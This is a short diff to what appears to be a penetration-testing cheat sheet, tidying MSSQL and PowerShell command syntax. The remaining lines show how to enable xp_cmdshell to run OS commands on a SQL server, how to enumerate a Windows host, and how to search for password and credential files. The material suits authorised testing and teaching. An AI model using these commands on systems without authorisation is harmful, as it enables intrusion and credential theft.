@@ -859,15 +859,15 @@ root@kali:$ mysql -u snovvcrash -p'qwe123' -e 'show databases;'
 #### Enable xp_cmdshell
 
 ```
-1> EXEC sp_configure 'show advanced options', 1;
+1> EXEC sp_configure 'show advanced options', 1
 2> GO
-1> RECONFIGURE;
+1> RECONFIGURE
 2> GO
-1> EXEC sp_configure 'xp_cmdshell', 1;
+1> EXEC sp_configure 'xp_cmdshell', 1
 2> GO
-1> RECONFIGURE;
+1> RECONFIGURE
 2> GO
-1> EXEC sp_configure 'xp_cmdshell', 1;
+1> EXEC sp_configure 'xp_cmdshell', 1
 2> GO
 1> xp_cmdshell 'whoami'
 2> GO
@@ -2325,8 +2325,8 @@ PS> netstat -ano | findstr LIST
 PS> ipconfig /all
 PS> route print
 PS> dir -force c:\
-PS> echo [Environment]::Is64BitOperatingSystem
-PS> echo $ExecutionContext.SessionState.LanguageMode
+PS> [Environment]::Is64BitOperatingSystem
+PS> $ExecutionContext.SessionState.LanguageMode
 
 PS> cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 PS> cmd /c where /R C:\ *.ini
